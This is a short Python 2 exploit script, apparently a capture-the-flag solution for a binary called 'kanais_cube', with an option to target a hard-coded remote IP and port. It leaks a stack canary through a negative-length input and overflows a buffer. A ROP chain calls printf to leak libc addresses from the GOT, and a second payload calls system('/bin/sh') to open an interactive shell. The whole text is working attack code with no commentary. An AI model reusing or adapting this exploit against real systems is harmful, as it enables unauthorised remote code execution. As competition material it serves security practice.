import pwnbox,struct
SERVER = False
s = lambda x: struct.pack("<I",x)
d = lambda x: struct.unpack("<I",x)[0]
if not SERVER:
  p = pwnbox.pipe.ProcessPipe("./kanais_cube_B5F0D8CF4683A69929EA8805F13FEF09CED025F2")
  q = pwnbox.pipe.ProcessPipe("./kanais_cube_B5F0D8CF4683A69929EA8805F13FEF09CED025F2")
else:
  p = pwnbox.pipe.SocketPipe("45.32.38.83", 25552)
  q = pwnbox.pipe.SocketPipe("45.32.38.83", 25552)

def get_rand():
  q.read_until("\n")
  q.write("-1\n")
  q.read_until("\n")
  q.write("A"*(0x86-0xc-1)+"\n")
  q.read_until("\n")
  r = q.read_byte(4)
  print hex(d(r))
  return r
p.read_until("!\n")
p.write("-1\n")
p.read_until("\n")
r = get_rand()
pay  = "A"*(0x86-0xc)
pay += r
pay += "B"*12

printf = 0x08048440
pr = 0x08048735
got = 0x0804a00c
#got = 0x0804a028
read = 0x08048430
pppr = 0x08048733
buf = 0x0804a080
leave_ret = 0x08048585
main = 0x080485dd
rop  = ""
rop += s(printf)
rop += s(pr)
rop += s(got)
rop += s(main)
p.write(pay+rop+"\n")
p.read_until("\n")
p.read_until("\n")
read_adr = d(p.read_byte(4))
printf_adr = d(p.read_byte(4))
print hex(read_adr)
print hex(printf_adr)
print hex(d(p.read_byte(4)))
libc = read_adr-0x000dabd0
system = libc+0x40190
binsh = libc+0x160a24
print "libc : "+hex(libc)

p.read_until("!\n")
p.write("-1\n")
p.read_until("\n")

pay  = "A"*(0x86-0xc)
pay += r
pay += "B"*12
new_rop=s(system)
new_rop += s(binsh)*2
p.write(pay+new_rop+"\n")
p.interact()
